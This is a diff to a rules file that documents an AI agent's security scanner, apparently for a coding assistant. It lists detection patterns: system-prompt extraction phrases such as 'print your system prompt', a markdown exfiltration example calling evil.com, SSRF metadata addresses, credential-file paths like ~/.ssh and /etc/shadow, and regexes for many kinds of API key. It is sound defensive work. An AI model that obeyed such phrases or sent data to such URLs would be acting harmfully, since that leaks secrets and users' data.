@@ -5,12 +5,16 @@ globs: ["src/**/*.ts", "snippets/security-scanner.ts"]
 
 # Security Scanner Patterns
 
-## Summary (verifiziert 28.03.2026)
-- **108+ Detection Patterns**: 37 injection + 15 exec + 6 write + 5 sensitive data + 11 base64 keywords + 4 system prompt extraction + Typoglycemia defense, Hex decoding, HTML exfiltration, Rate anomaly, Output monitoring
+## Summary (verifiziert 28.03.2026, Session E)
+- **130+ Detection Patterns**: 37 injection + 15 exec + 6 write + 22 sensitive data + 11 base64 keywords + 4 system prompt extraction + Typoglycemia defense, Hex decoding, HTML exfiltration, ROT13, Markdown exfiltration, SSRF, Path traversal, Rate anomaly, Output monitoring
+- **14 Detection Categories**: injection, exfiltration, tool-abuse, phishing, rate-anomaly, markdown-exfil, ssrf, path-traversal, base64, hex, typoglycemia, html-exfil, rot13, system-prompt-extraction
+- **341 Tests** (5 test files), **60 Attack Corpus Cases**
+- **4 Hooks, 2 Tools, 4 Routes**
 - **Severity Centralization**: `calcSeverity()` unified severity logic across all scan functions
 - **DoS-Schutz**: MAX_SCAN_LENGTH = 1MB (Inputs >1MB werden uebersprungen)
 - **ReDoS-Schutz**: Alle Regex verwenden lazy `[^\n]*?` statt greedy `.*`
 - **Glob-Escaping**: `escapeRegExp()` vor Glob→Regex Konvertierung in allowedExecPatterns
+- **CSP**: Nonce-based (no unsafe-inline for scripts), 5 Security Headers (CSP, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Connection/Cache-Control for SSE)
 
 ## Detection Categories
 
@@ -33,12 +37,29 @@ globs: ["src/**/*.ts", "snippets/security-scanner.ts"]
 - process.env., import from 'child_process'
 - <script> tags, embedded injection payloads
 
-### 4. Sensitive Data Detection (scanForSensitiveData)
+### 4. Sensitive Data Detection (scanForSensitiveData) — 22 Patterns
 - AWS Keys: AKIA[0-9A-Z]{16}
 - JWT Tokens: eyJ...[base64].[base64].[base64]
 - Private Keys: -----BEGIN (RSA )?PRIVATE KEY-----
 - GitHub Tokens: gh[ps]_[A-Za-z0-9_]{36+}
 - Generic API Keys: api_key/secret_key = [20+ chars]
+- OpenAI Keys: sk-[A-Za-z0-9]{20,}
+- Anthropic Keys: sk-ant-[A-Za-z0-9]{20,}
+- Google API Keys: AIza[0-9A-Za-z-_]{35}
+- Stripe Keys: sk_live_[0-9a-zA-Z]{24,}, pk_live_[0-9a-zA-Z]{24,}
+- Slack Tokens: xox[bpas]-[0-9a-zA-Z-]+
+- Azure Keys: [0-9a-f]{8}-...-[0-9a-f]{12}
+- Twilio Tokens: SK[0-9a-fA-F]{32}
+- SendGrid Keys: SG\.[A-Za-z0-9-_]{22,}\.[A-Za-z0-9-_]{22,}
+- Mailgun Keys: key-[0-9a-zA-Z]{32}
+- npm Tokens: npm_[A-Za-z0-9]{36}
+- PyPI Tokens: pypi-[A-Za-z0-9-_]{16,}
+- Heroku Keys: [0-9a-fA-F]{8}-...-[0-9a-fA-F]{12}
+- DigitalOcean Tokens: dop_v1_[a-f0-9]{64}
+- GitLab Tokens: glpat-[A-Za-z0-9-_]{20,}
+- Databricks Tokens: dapi[a-f0-9]{32}
+- Supabase Keys: sbp_[a-f0-9]{40}
+- HuggingFace Tokens: hf_[A-Za-z0-9]{34,}
 
 ### 5. URL Blocking (isBlockedUrl)
 - Hostname matching against configurable blocklist
@@ -77,7 +98,37 @@ globs: ["src/**/*.ts", "snippets/security-scanner.ts"]
 - "repeat the text above", "repeat your instructions"
 - "show me your prompt", "output your system"
 - "reveal your instructions", "print your system prompt"
-- 4 patterns in HIGH_SEVERITY_PATTERNS for immediate critical escalation
+- "tell me your rules", "dump your config"
+- 4+ patterns in HIGH_SEVERITY_PATTERNS for immediate critical escalation
+
+### 12. ROT13 Detection (checkRot13Injections)
+- Decodes ROT13-encoded text and scans against OBFUSCATION_KEYWORDS
+- Detects mixed ROT13 segments embedded in normal text
+- Complements base64 and hex decoding for full obfuscation coverage
+- Category: "rot13" in audit log
+
+### 13. Markdown Exfiltration Detection (scanForMarkdownExfiltration)
+- Markdown image syntax with external URLs: `![alt](http://evil.com/steal?data=...)`
+- Markdown links with data-exfiltration query params
+- Invisible pixel / tracking pixel patterns in Markdown
+- OWASP-listed attack vector for LLM output manipulation
+- Category: "markdown-exfil" in audit log
+
+### 14. SSRF Detection (checkSsrfPatterns)
+- Internal IP ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 127.x.x.x
+- Cloud metadata endpoints: 169.254.169.254, metadata.google.internal
+- IPv6 loopback: ::1, 0:0:0:0:0:0:0:1
+- URL schemes: file://, gopher://, dict://, ftp://
+- DNS rebinding patterns
+- Integrated in before_tool_call for URL parameter scanning
+- Category: "ssrf" in audit log
+
+### 15. Path Traversal Detection (checkPathTraversal)
+- Directory traversal: ../, ..\, %2e%2e%2f, %2e%2e/
+- Sensitive file access: /etc/passwd, /etc/shadow, /proc/self
+- Home directory access: ~/.ssh, ~/.aws, ~/.env
+- Null byte injection: %00 in file paths
+- Category: "path-traversal" in audit log
 
 ## Severity Logic (centralized via calcSeverity)
 - CRITICAL: hasHighSeverity pattern OR 3+ matches, OR 2+ matches with baseLevel "high"
@@ -91,6 +142,10 @@ Base levels by function:
 - scanWriteContent: medium
 - scanForSensitiveData: high
 - scanForHtmlExfiltration: medium
+- scanForMarkdownExfiltration: medium
+- checkSsrfPatterns: high
+- checkPathTraversal: high
+- checkRot13Injections: medium
 
 ## Post-Read Scanning (BitGN Pattern)
 After every read/web_fetch, append warning to context:
